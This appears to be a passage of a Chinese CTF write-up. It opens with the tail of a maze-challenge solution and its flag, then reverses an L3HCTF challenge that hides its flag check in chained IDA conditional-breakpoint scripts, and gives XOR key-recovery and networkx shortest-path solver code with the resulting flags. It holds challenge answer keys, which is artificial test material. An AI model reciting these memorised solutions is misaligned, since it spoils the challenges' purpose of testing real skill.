&#x27;0x414e20&#x27;, &#x27;0x414d90&#x27;, &#x27;0x414cf0&#x27;, &#x27;0x414c50&#x27;, &#x27;0x414bb0&#x27;, &#x27;0x414b20&#x27;, &#x27;0x414a90&#x27;, &#x27;0x4149f0&#x27;, &#x27;0x414950&#x27;, &#x27;0x4148b0&#x27;, &#x27;0x414810&#x27;, &#x27;0x414770&#x27;, &#x27;0x4146d0&#x27;, &#x27;0x413890&#x27;, &#x27;0x4137f0&#x27;, &#x27;0x413750&#x27;, &#x27;0x4136b0&#x27;, &#x27;0x414630&#x27;, &#x27;0x414590&#x27;, &#x27;0x4144f0&#x27;, &#x27;0x414450&#x27;, &#x27;0x4143b0&#x27;, &#x27;0x414310&#x27;, &#x27;0x414270&#x27;, &#x27;0x4141d0&#x27;, &#x27;0x414130&#x27;, &#x27;0x414090&#x27;, &#x27;0x413ff0&#x27;, &#x27;0x413f60&#x27;, &#x27;0x413ec0&#x27;, &#x27;0x413e20&#x27;, &#x27;0x413d80&#x27;, &#x27;0x413cf0&#x27;, &#x27;0x413c50&#x27;, &#x27;0x413bb0&#x27;, &#x27;0x413b10&#x27;, &#x27;0x413a70&#x27;, &#x27;0x413620&#x27;, &#x27;0x412630&#x27;, &#x27;0x411880&#x27;, &#x27;0x4101c0&#x27;, &#x27;0x410260&#x27;, &#x27;0x4102f0&#x27;, &#x27;0x410390&#x27;, &#x27;0x410430&#x27;, &#x27;0x4104d0&#x27;, &#x27;0x410570&#x27;, &#x27;0x410610&#x27;, &#x27;0x4106b0&#x27;, &#x27;0x410750&#x27;, &#x27;0x4107f0&#x27;, &#x27;0x410890&#x27;, &#x27;0x410920&#x27;, &#x27;0x4109b0&#x27;, &#x27;0x410a50&#x27;, &#x27;0x410af0&#x27;, &#x27;0x410b90&#x27;, &#x27;0x410c30&#x27;, &#x27;0x410cd0&#x27;, &#x27;0x410d70&#x27;, &#x27;0x410e10&#x27;, &#x27;0x410eb0&#x27;, &#x27;0x411920&#x27;, &#x27;0x4119c0&#x27;, &#x27;0x411a60&#x27;, &#x27;0x411b00&#x27;, &#x27;0x411ba0&#x27;, &#x27;0x411c40&#x27;, &#x27;0x411ce0&#x27;, &#x27;0x411d80&#x27;, &#x27;0x411e20&#x27;, &#x27;0x411ec0&#x27;, &#x27;0x411f60&#x27;, &#x27;0x412000&#x27;, &#x27;0x4120a0&#x27;, &#x27;0x412140&#x27;, &#x27;0x4121d0&#x27;, &#x27;0x410f50&#x27;, &#x27;0x40fa60&#x27;, &#x27;0x40f580&#x27;, &#x27;0x40f4f0&#x27;, &#x27;0x40f450&#x27;, &#x27;0x40f3c0&#x27;, &#x27;0x40f330&#x27;, &#x27;0x40f290&#x27;, &#x27;0x40f1f0&#x27;, &#x27;0x40f150&#x27;, &#x27;0x40f0c0&#x27;, &#x27;0x40f020&#x27;, &#x27;0x40ef80&#x27;, &#x27;0x40eef0&#x27;, &#x27;0x40ee50&#x27;, &#x27;0x40edb0&#x27;, &#x27;0x40ed20&#x27;, &#x27;0x40ec80&#x27;, &#x27;0x40ebf0&#x27;, &#x27;0x40eb50&#x27;, &#x27;0x40eac0&#x27;, &#x27;0x40ea20&#x27;, &#x27;0x40e990&#x27;, &#x27;0x40e8f0&#x27;, &#x27;0x40e850&#x27;, &#x27;0x40e7b0&#x27;, &#x27;0x40e710&#x27;, &#x27;0x40e670&#x27;, &#x27;0x40e5d0&#x27;, &#x27;0x40e530&#x27;, &#x27;0x40e490&#x27;, &#x27;0x40e3f0&#x27;, &#x27;0x40e350&#x27;, &#x27;0x40e2b0&#x27;, &#x27;0x40e220&#x27;, &#x27;0x40e180&#x27;, &#x27;0x40e0e0&#x27;, &#x27;0x40e040&#x27;, &#x27;0x40dfb0&#x27;, &#x27;0x40df10&#x27;, &#x27;0x40de70&#x27;, &#x27;0x40ddd0&#x27;, &#x27;0x40dd40&#x27;, &#x27;0x40dca0&#x27;, &#x27;0x40dc00&#x27;, &#x27;0x40db60&#x27;, &#x27;0x40dac0&#x27;, &#x27;0x40da20&#x27;, &#x27;0x40d980&#x27;, &#x27;0x40d8e0&#x27;, &#x27;0x40d840&#x27;, &#x27;0x40d7a0&#x27;, &#x27;0x40d700&#x27;, &#x27;0x40f9c0&#x27;, &#x27;0x40fe10&#x27;, &#x27;0x4116b0&#x27;, &#x27;0x412450&#x27;, &#x27;0x4131e0&#x27;, &#x27;0x413280&#x27;, &#x27;0x413320&#x27;, &#x27;0x4133c0&#x27;, &#x27;0x413460&#x27;, &#x27;0x4134f0&#x27;, &#x27;0x4124f0&#x27;, &#x27;0x411740&#x27;, &#x27;0x40fea0&#x27;, &#x27;0x40ff40&#x27;, &#x27;0x40ffe0&#x27;, &#x27;0x410080&#x27;, &#x27;0x410120&#x27;, &#x27;0x4117e0&#x27;, &#x27;0x412590&#x27;, &#x27;0x413590&#x27;, &#x27;0x4139d0&#x27;, &#x27;0x416820&#x27;, &#x27;0x416780&#x27;, &#x27;0x4166e0&#x27;, &#x27;0x416640&#x27;, &#x27;0x4165a0&#x27;, &#x27;0x416500&#x27;, &#x27;0x416460&#x27;, &#x27;0x4163c0&#x27;, &#x27;0x416320&#x27;, &#x27;0x416280&#x27;, &#x27;0x4168c0&#x27;, &#x27;0x419110&#x27;, &#x27;0x419370&#x27;, &#x27;0x419fb0&#x27;, &#x27;0x41a040&#x27;, &#x27;0x41a0e0&#x27;, &#x27;0x41a180&#x27;, &#x27;0x41a220&#x27;, &#x27;0x41a2c0&#x27;, &#x27;0x41a350&#x27;, &#x27;0x41a3f0&#x27;, &#x27;0x41a490&#x27;, &#x27;0x41a530&#x27;, &#x27;0x41a5d0&#x27;, &#x27;0x419410&#x27;, &#x27;0x4191b0&#x27;, &#x27;0x416960&#x27;, &#x27;0x416a00&#x27;, &#x27;0x416a90&#x27;, &#x27;0x416b20&#x27;, &#x27;0x416bc0&#x27;, &#x27;0x416c60&#x27;, &#x27;0x416d00&#x27;, &#x27;0x416da0&#x27;, &#x27;0x416e40&#x27;, &#x27;0x416ee0&#x27;, &#x27;0x416f80&#x27;, &#x27;0x417010&#x27;, &#x27;0x4170b0&#x27;, &#x27;0x417150&#x27;, &#x27;0x4171e0&#x27;, &#x27;0x417280&#x27;, &#x27;0x417320&#x27;, &#x27;0x4173c0&#x27;, &#x27;0x417460&#x27;, &#x27;0x417500&#x27;, &#x27;0x4175a0&#x27;, &#x27;0x417640&#x27;, &#x27;0x4176e0&#x27;, &#x27;0x417780&#x27;, &#x27;0x417820&#x27;, &#x27;0x4178c0&#x27;, &#x27;0x417960&#x27;, &#x27;0x417a00&#x27;, &#x27;0x417aa0&#x27;, &#x27;0x417b30&#x27;, &#x27;0x417bd0&#x27;, &#x27;0x417c70&#x27;, &#x27;0x417d10&#x27;, &#x27;0x417da0&#x27;, &#x27;0x417e30&#x27;, &#x27;0x417ec0&#x27;, &#x27;0x417f60&#x27;, &#x27;0x418000&#x27;, &#x27;0x4180a0&#x27;, &#x27;0x418140&#x27;, &#x27;0x4181e0&#x27;, &#x27;0x418280&#x27;, &#x27;0x418310&#x27;, &#x27;0x4183b0&#x27;, &#x27;0x418440&#x27;, &#x27;0x4184e0&#x27;, &#x27;0x418580&#x27;, &#x27;0x418610&#x27;, &#x27;0x4186b0&#x27;, &#x27;0x419250&#x27;, &#x27;0x4194b0&#x27;, &#x27;0x41be60&#x27;, &#x27;0x41bf90&#x27;, &#x27;0x41c8e0&#x27;, &#x27;0x41e1e0&#x27;, &#x27;0x41e140&#x27;, &#x27;0x41ea10&#x27;, &#x27;0x41ebf0&#x27;, &#x27;0x41f1e0&#x27;]dssddddddddddddddddddssssssssssdddddddddddddddddddddddddddddddwwwwwwaaaaaaaaassddddddssaaaaaaaaaaaaawwdddwwwwwddddddddddddddddddddddddddsssssssssssssssddddddddddddddddwwwwwwwwwwwwwaaaaaaawwwwddddddddddddssssssdsdsdsssasaasssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaasaaaaaaaaaaaaaaaaaaawwwwdddddddddddddddddddddsddddddddddddddwwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasssssdddddwwwddddsssssaaaaaaaaassssddddddddddwwwddddddddddddddddddddddddddddddddddddddddddddddddssssssassssDASCTF&#123;0a80fbe4b623aa3c09173ecf9147601e&#125; 对于networkx的学习，可以参考此文档 https://www.osgeo.cn/networkx/tutorial.html 对于求最短路径来说，基本就是 创建合适的图 添加节点，添加边 调用shortest_path，求出最短路径，这里求出的是经过的节点 然后再根据具体题目要求，根据经过的节点，把操作的步骤打印出来即可 IDAAAAAA分析此题为今年L3HCTF的一道re题，题目仅给了一个i64文件，没有给可执行文件，IDA打开分析 sub_401E97函数返回1，则正确, 进入此函数发现有5个方程，用z3解 发现无解 再次观察，发现这里有个断点，来到断点窗口 发现是个条件断点，将conditon的数据复制出来 12345678910111213141516global jIS40AjIS40A = [xxx, xxx, xxx。。。。] # 很长的密文 是个列表，长度是1000N4QKUt = 0EpUdLx = 4728923 # 0x048285B idaapi.add_bpt(EpUdLx) # 0x048285B uwGgnM = idaapi.bpt_t()idaapi.get_bpt(EpUdLx, uwGgnM)uwGgnM.elang = &quot;Python&quot; uwGgnM.condition = &quot;N4QKUt = &#123;&#125;\\n&quot;.format(N4QKUt) + &#x27;VLzxDy = idaapi.get_byte(5127584 + N4QKUt)\\nVLzxDy -= ord(\\&#x27;a\\&#x27;)\\nif VLzxDy == 0:\\n bYsMTa = 287\\n LjzrdT = b\\&#x27;lqAT7pNI3BX\\&#x27;\\nelif VLzxDy == 1:\\n bYsMTa = 96\\n LjzrdT = b\\&#x27;z3Uhis74aPq\\&#x27;\\nelif VLzxDy == 2:\\n bYsMTa = 8\\n LjzrdT = b\\&#x27;9tjseMGBHR5\\&#x27;\\nelif VLzxDy == 3:\\n bYsMTa = 777\\n LjzrdT = b\\&#x27;FhnvgMQjexH\\&#x27;\\nelif VLzxDy == 4:\\n bYsMTa = 496\\n LjzrdT = b\\&#x27;SKnZ51f9WsE\\&#x27;\\nelif VLzxDy == 5:\\n bYsMTa = 822\\n LjzrdT = b\\&#x27;gDJy104BSHW\\&#x27;\\nelif VLzxDy == 6:\\n bYsMTa = 914\\n LjzrdT = b\\&#x27;PbRV4rSM7fd\\&#x27;\\nelif VLzxDy == 7:\\n bYsMTa = 550\\n LjzrdT = b\\&#x27;WHPnoMTsbx3\\&#x27;\\nelif VLzxDy == 8:\\n bYsMTa = 273\\n LjzrdT = b\\&#x27;mLx5hvlqufG\\&#x27;\\nelif VLzxDy == 9:\\n bYsMTa = 259\\n LjzrdT = b\\&#x27;QvKgNmUFTnW\\&#x27;\\nelif VLzxDy == 10:\\n bYsMTa = 334\\n LjzrdT = b\\&#x27;TCrHaitRfY1\\&#x27;\\nelif VLzxDy == 11:\\n bYsMTa = 966\\n LjzrdT = b\\&#x27;m26IAvjq1zC\\&#x27;\\nelif VLzxDy == 12:\\n bYsMTa = 331\\n LjzrdT = b\\&#x27;dQb2ufTZwLX\\&#x27;\\nelif VLzxDy == 13:\\n bYsMTa = 680\\n LjzrdT = b\\&#x27;Y6Sr7znOeHL\\&#x27;\\nelif VLzxDy == 14:\\n bYsMTa = 374\\n LjzrdT = b\\&#x27;hLFj1wl5A0U\\&#x27;\\nelif VLzxDy == 15:\\n bYsMTa = 717\\n LjzrdT = b\\&#x27;H6W03R7TLFe\\&#x27;\\nelif VLzxDy == 16:\\n bYsMTa = 965\\n LjzrdT = b\\&#x27;fphoJwDKsTv\\&#x27;\\nelif VLzxDy == 17:\\n bYsMTa = 952\\n LjzrdT = b\\&#x27;CMF1Vk7NH4O\\&#x27;\\nelif VLzxDy == 18:\\n bYsMTa = 222\\n LjzrdT = b\\&#x27;43PSbAlgLqj\\&#x27;\\nelse:\\n bYsMTa = -1\\nif bYsMTa &lt; 0:\\n cpu.rsp -= 8\\n cpu.rdi = 4927649\\n cpu.rax = 0\\n idaapi.patch_qword(cpu.rsp, 4202616)\\n idaapi.del_bpt(cpu.rip)\\n cpu.rip = 4263680\\nelse:\\n zaqhdD = 0x486195\\n bYsMTa = jIS40A[bYsMTa]\\n\\n idaapi.patch_bytes(5117568, bYsMTa)\\n idaapi.patch_bytes(5117488, LjzrdT)\\n\\n cpu.rsp -= 8\\n idaapi.patch_qword(cpu.rsp, zaqhdD)\\n cpu.rdi = 5117568\\n cpu.rsi = len(bYsMTa)\\n cpu.rdx = 5117488\\n cpu.rcx = 11\\n cpu.r8 = 5117568\\n cpu.rax = 5117568\\n\\n idaapi.add_bpt(zaqhdD)\\n jQfwUA = idaapi.bpt_t()\\n idaapi.get_bpt(zaqhdD, jQfwUA)\\n jQfwUA.elang = &quot;Python&quot;\\n jQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\nSdjOr3 = &#123;&#125;\\\\n&quot;.format(N4QKUt, len(bYsMTa)) + \\&#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\\\nzaqhdD = 4767838\\\\nidaapi.add_bpt(zaqhdD)\\\\njQfwUA = idaapi.bpt_t()\\\\nidaapi.get_bpt(zaqhdD, jQfwUA)\\\\njQfwUA.elang = &quot;Python&quot;\\\\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\\\\\n&quot;.format(N4QKUt+1) + bYsMTa\\\\nidaapi.del_bpt(zaqhdD)\\\\nidaapi.add_bpt(jQfwUA)\\\\nidaapi.del_bpt(cpu.rip)\\\\ncpu.rsp -= 8\\\\nidaapi.patch_qword(cpu.rsp, zaqhdD)\\\\ncpu.rip = 4447160\\\\n\\&#x27;\\n idaapi.del_bpt(zaqhdD)\\n idaapi.add_bpt(jQfwUA)\\n idaapi.del_bpt(cpu.rip)\\n cpu.rip = 4201909\\n&#x27; idaapi.del_bpt(EpUdLx)idaapi.add_bpt(uwGgnM) # 改为条件断点cpu.rsp -= 8idaapi.patch_qword(cpu.rsp, EpUdLx) # 0x48285Bcpu.rip = 4202096 # retn --&gt;来到刚才条件断点的位置 可以发现，大致流程为，触发0x40201F处的断点的时候，设置一个新的条件断点，跳转过去，触发新的条件断点的condition，由此可见验证flag的算法全部在这些condition中 将uwGgnM.condition 稍作整理，然后分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596N4QKUt = 0VLzxDy = idaapi.get_byte(5127584 + N4QKUt) # 5127584(0x4e3da0) 为程序中输入的flag的地址 flag[N4QKUt]VLzxDy -= ord(&#x27;a&#x27;)if VLzxDy == 0: # 根据VLzxDy初始化2个值 bYsMTa = 287 # jIS40A的索引 LjzrdT = b&#x27;lqAT7pNI3BX&#x27; # 解密 jIS40A[bYsMTa] 的keyelif VLzxDy == 1: bYsMTa = 96 LjzrdT = b&#x27;z3Uhis74aPq&#x27;elif VLzxDy == 2: bYsMTa = 8 LjzrdT = b&#x27;9tjseMGBHR5&#x27;elif VLzxDy == 3: bYsMTa = 777 LjzrdT = b&#x27;FhnvgMQjexH&#x27;elif VLzxDy == 4: bYsMTa = 496 LjzrdT = b&#x27;SKnZ51f9WsE&#x27;elif VLzxDy == 5: bYsMTa = 822 LjzrdT = b&#x27;gDJy104BSHW&#x27;elif VLzxDy == 6: bYsMTa = 914 LjzrdT = b&#x27;PbRV4rSM7fd&#x27;elif VLzxDy == 7: bYsMTa = 550 LjzrdT = b&#x27;WHPnoMTsbx3&#x27;elif VLzxDy == 8: bYsMTa = 273 LjzrdT = b&#x27;mLx5hvlqufG&#x27;elif VLzxDy == 9: bYsMTa = 259 LjzrdT = b&#x27;QvKgNmUFTnW&#x27;elif VLzxDy == 10: bYsMTa = 334 LjzrdT = b&#x27;TCrHaitRfY1&#x27;elif VLzxDy == 11: bYsMTa = 966 LjzrdT = b&#x27;m26IAvjq1zC&#x27;elif VLzxDy == 12: bYsMTa = 331 LjzrdT = b&#x27;dQb2ufTZwLX&#x27;elif VLzxDy == 13: bYsMTa = 680 LjzrdT = b&#x27;Y6Sr7znOeHL&#x27;elif VLzxDy == 14: bYsMTa = 374 LjzrdT = b&#x27;hLFj1wl5A0U&#x27;elif VLzxDy == 15: bYsMTa = 717 LjzrdT = b&#x27;H6W03R7TLFe&#x27;elif VLzxDy == 16: bYsMTa = 965 LjzrdT = b&#x27;fphoJwDKsTv&#x27;elif VLzxDy == 17: bYsMTa = 952 LjzrdT = b&#x27;CMF1Vk7NH4O&#x27;elif VLzxDy == 18: bYsMTa = 222 LjzrdT = b&#x27;43PSbAlgLqj&#x27;else: bYsMTa = -1 if bYsMTa &lt; 0: # Wrong的位置 cpu.rsp -= 8 cpu.rdi = 4927649 # 0x4b30a1: &quot;O, no&quot; # 传递参数 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) # leave retn idaapi.del_bpt(cpu.rip) cpu.rip = 4263680 # 0410F00 printf(&quot;O, no&quot;)else: zaqhdD = 0x486195 bYsMTa = jIS40A[bYsMTa] # 从一长串密文中取出数据 idaapi.patch_bytes(5117568, bYsMTa) # 0x4e1680 # 取出的密文 idaapi.patch_bytes(5117488, LjzrdT) # 0x4e1630 # 取出的key # rdi, rsi, rdx, rcx, r8, r9 cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, zaqhdD) # 0x486195 # 设置参数 cpu.rdi = 5117568 # 0x4e1680 # 密文地址 cpu.rsi = len(bYsMTa) # 密文长度 cpu.rdx = 5117488 # 0x4e1630 # key地址 cpu.rcx = 11 # key长度 cpu.r8 = 5117568 # 0x4e1680 # 密文地址 cpu.rax = 5117568 # 0x4e1680 # 返回值 idaapi.add_bpt(zaqhdD) jQfwUA = idaapi.bpt_t() idaapi.get_bpt(zaqhdD, jQfwUA) jQfwUA.elang = &quot;Python&quot; jQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(bYsMTa)) + &#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nzaqhdD = 4767838\\nidaapi.add_bpt(zaqhdD)\\njQfwUA = idaapi.bpt_t()\\nidaapi.get_bpt(zaqhdD, jQfwUA)\\njQfwUA.elang = &quot;Python&quot;\\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + bYsMTa\\nidaapi.del_bpt(zaqhdD)\\nidaapi.add_bpt(jQfwUA)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, zaqhdD)\\ncpu.rip = 4447160\\n&#x27; idaapi.del_bpt(zaqhdD) idaapi.add_bpt(jQfwUA) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909 #0x401db5 # 5个参数 先执行解密，然后再-&gt;0x486195(因为上面已经把cpu.esp-8的位置改为了0x486195), 触发条件断点 可以发现流程就是，根据输入的flag的每个字符，来判断进入下一个节点解密函数是一个简单的异或, 先随便找几个解密看看，key的长度都是11 123456789def dec(_x, _key): m = [] for i in range(len(encs[_x])): m.append(encs[_x][i] ^ ord(_key[i % 11])) print(bytes(m).decode())dec(287, &#x27;lqAT7pNI3BX&#x27;)print(&#x27;===============================================================&#x27;)dec(96, &#x27;z3Uhis74aPq&#x27;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293NyPGpw = idaapi.get_byte(5127584 + N4QKUt)NyPGpw -= ord(&#x27;a&#x27;)if NyPGpw == 0: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif NyPGpw == 1: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif NyPGpw == 2: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;else: afvkwL = -1if afvkwL &lt; 0: cpu.rsp -= 8 cpu.rdi = 4927649 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) idaapi.del_bpt(cpu.rip) cpu.rip = 4263680else: RrNlIm = 0x4438d8 afvkwL = jIS40A[afvkwL] idaapi.patch_bytes(5117568, afvkwL) idaapi.patch_bytes(5117488, hsYnNw) cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, RrNlIm) cpu.rdi = 5117568 cpu.rsi = len(afvkwL) cpu.rdx = 5117488 cpu.rcx = 11 cpu.r8 = 5117568 cpu.rax = 5117568 idaapi.add_bpt(RrNlIm) XKDdOn = idaapi.bpt_t() idaapi.get_bpt(RrNlIm, XKDdOn) XKDdOn.elang = &quot;Python&quot; XKDdOn.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(afvkwL)) + &#x27;afvkwL = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nRrNlIm = 4370382\\nidaapi.add_bpt(RrNlIm)\\nXKDdOn = idaapi.bpt_t()\\nidaapi.get_bpt(RrNlIm, XKDdOn)\\nXKDdOn.elang = &quot;Python&quot;\\nXKDdOn.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + afvkwL\\nidaapi.del_bpt(RrNlIm)\\nidaapi.add_bpt(XKDdOn)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, RrNlIm)\\ncpu.rip = 4220940\\n&#x27; idaapi.del_bpt(RrNlIm) idaapi.add_bpt(XKDdOn) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909===============================================================XxrupR = idaapi.get_byte(5127584 + N4QKUt)XxrupR -= ord(&#x27;a&#x27;)if XxrupR == 0: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;elif XxrupR == 1: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;elif XxrupR == 2: SAoBHX = 667 EOlVWv = b&#x27;vjHiPd4bBuf&#x27;else: SAoBHX = -1if SAoBHX &lt; 0: cpu.rsp -= 8 cpu.rdi = 4927649 cpu.rax = 0 idaapi.patch_qword(cpu.rsp, 4202616) idaapi.del_bpt(cpu.rip) cpu.rip = 4263680else: uBEeMD = 0x45e68a SAoBHX = jIS40A[SAoBHX] idaapi.patch_bytes(5117568, SAoBHX) idaapi.patch_bytes(5117488, EOlVWv) cpu.rsp -= 8 idaapi.patch_qword(cpu.rsp, uBEeMD) cpu.rdi = 5117568 cpu.rsi = len(SAoBHX) cpu.rdx = 5117488 cpu.rcx = 11 cpu.r8 = 5117568 cpu.rax = 5117568 idaapi.add_bpt(uBEeMD) piHsvj = idaapi.bpt_t() idaapi.get_bpt(uBEeMD, piHsvj) piHsvj.elang = &quot;Python&quot; piHsvj.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(SAoBHX)) + &#x27;SAoBHX = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nuBEeMD = 4808702\\nidaapi.add_bpt(uBEeMD)\\npiHsvj = idaapi.bpt_t()\\nidaapi.get_bpt(uBEeMD, piHsvj)\\npiHsvj.elang = &quot;Python&quot;\\npiHsvj.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + SAoBHX\\nidaapi.del_bpt(uBEeMD)\\nidaapi.add_bpt(piHsvj)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, uBEeMD)\\ncpu.rip = 4405922\\n&#x27; idaapi.del_bpt(uBEeMD) idaapi.add_bpt(piHsvj) idaapi.del_bpt(cpu.rip) cpu.rip = 4201909 可以发现都符合一个框架 12345678910111213xxxx = idaapi.get_byte(5127584 + N4QKUt)xxxx -= ord(&#x27;a&#x27;)if xxxx == 0: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27;elif xxxx == 1: afvkwL = 667 hsYnNw = b&#x27;vjHiPd4bBuf&#x27; .......else: afvkwL = -1if afvkwL &lt; 0: ........ 因为解密出来都含有idaapi.get_byte(5127584 + N4QKUt)，而key的长度都是11，因此可以对key全部爆破出来 123456789101112131415encs = [....] def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None # i = 426 return keyskeys = get_keys()print(keys.count(None)) # 1 只有1个节点没有解密成功，即没有指向，应该就是终点，结合题目，是个最短路径问题 终点的索引是426，写脚本找到索引426的key 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def dec(_src, _key): m = [] for i in range(len(_src)): m.append(_src[i] ^ _key[i % 11]) return bytes(m).decode(&quot;utf-8&quot;)def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None return keysdef get_node_edges(_dec_src): # 获取每条边，2个点即构成一条边 # 传入解密后的脚本 i = _dec_src.index(&#x27;&lt;&#x27;) _dec_src = _dec_src[:i] m = re.findall(r&#x27; = (\\d+)&#x27;, _dec_src) nodes = [int(i) for i in m] return nodes keys = get_keys()for i, value in enumerate(encs): if keys[i] == None: target_node = i else: dec_src = dec(value, keys[i]) nodes = get_node_edges(dec_src) # 添加边 for j in range(len(nodes)): if nodes[j]==426: print(i) print(dec_src) exit()# 705# GKjYbv = idaapi.get_byte(5127584 + N4QKUt)# GKjYbv -= ord(&#x27;a&#x27;)# if GKjYbv == 0:# NizaZl = 426# BCTfiu = b&#x27;akUx3IWl29V&#x27;# else:# ...... key为akUx3IWl29V, 解密得到 123idaapi.del_bpt(cpu.rip)cpu.rax = 0cpu.rip = 4202594 # 0x402062 是终点无疑了，现在需要找出所有的节点，以及边（2个节点就是1个边，有方向）,然后用networkx求解 networkx求最短路径直接贴脚本了，就是通过正则表达式匹配出node,然后构造边，添加边，用networkx求出路径，再写出控制方向的的flag字符即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import reimport networkximport hashlibencs = [....] def dec(_src, _key): m = [] for i in range(len(_src)): m.append(_src[i] ^ _key[i % 11]) return bytes(m).decode(&quot;utf-8&quot;)def get_keys(): sign = [ord(i) for i in &#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;[11:22]] keys = [0]*1000 # encs的长度是1000， 对应1000个key for i in range(len(encs)): tmp = encs[i][11:22] tmp_key = [tmp[j] ^ sign[j] for j in range(11)] # 获得key sign_1 = [tmp_key[j] ^ encs[i][j] for j in range(11)] if b&#x27;= id&#x27; in bytes(sign_1): keys[i] = bytes(tmp_key) else: keys[i] = None return keysdef get_node_edges(_dec_src): # 获取每个节点指向的其他的节点，然后通过此来获取边 # 传入解密后的脚本 i = _dec_src.index(&#x27;&lt;&#x27;) _dec_src = _dec_src[:i] m = re.findall(r&#x27; = (\\d+)&#x27;, _dec_src) nodes = [int(i) for i in m] return nodes keys = get_keys()edges = []node2node = []for i, value in enumerate(encs): if keys[i] == None: target_node = i # 终点 nodes = [] else: dec_src = dec(value, keys[i]) nodes = get_node_edges(dec_src) # 添加边 for j in range(len(nodes)): # 根据获取的指向的节点来添加边 edges.append([i, nodes[j]]) node2node.append(nodes)src_node = -1 # 最开始还有1个节点src_edge = [287, 96, 8, 777, 496, 822, 914, 550, 273, 259, 334, 966, 331, 680, 374, 717, 965, 952, 222]# 将最初的边添加进去for i in src_edge: edges.append([src_node, i])G = networkx.DiGraph()G.add_node(-1)for i in range(len(encs)): G.add_node(i)for i in edges: G.add_edge(i[0], i[1])path = networkx.shortest_path(G, source=src_node, target=target_node)print(path) # 打印出路径来s = []s.append(src_edge.index(path[1]))for i in range(2, len(path)): s.append(node2node[path[i-1]].index(path[i]))print(s)s = &quot;&quot;.join([chr(ord(&#x27;a&#x27;) + i) for i in s])print(s)print(&quot;L3HCTF&#123;&quot; + hashlib.md5(s.encode()).hexdigest() + &quot;&#125;&quot;)# [-1, 331, 578, 255, 875, 765, 687, 209, 119, 963, 939, 443, 250, 366, 65, 504, 920, 849, 720, 893, 728, 580, 114, 665, 72, 51, 241, 519, 473, 970, 984, 557, 90, 793, 487, 67, 428, 236, 263, 24, 39, 104, 505, 491, 95, 223, 486, 798, 873, 872, 64, 229, 37, 274, 329, 601, 372, 750, 446, 3, 332, 698, 277, 740, 816, 845, 570, 828, 21, 36, 839, 770, 343, 451, 151, 994, 937, 760, 644, 9, 614, 302, 454, 153, 840, 76, 424, 352, 950, 238, 613, 497, 898, 858, 415, 205, 393, 927, 522, 705, 426]# [12, 2, 0, 4, 1, 0, 2, 4, 3, 0, 0, 1, 5, 0, 2, 0, 2, 0, 1, 6, 0, 6, 1, 1, 0, 0, 4, 0, 2, 0, 1, 2, 1, 0, 2, 4, 1, 0, 6, 0, 0, 0, 1, 2, 3, 1, 6, 1, 3, 1, 2, 1, 3, 0, 2, 6, 0, 1, # 5, 1, 1, 4, 1, 0, 1, 0, 1, 1, 1, 1, 1, 2, 0, 0, 1, 3, 0, 1, 0, 1, 0, 5, 0, 2, 2, 0, 2, 3, 0, 6, 3, 0, 0, 1, 0, 1, 0, 0, 0, 0]# 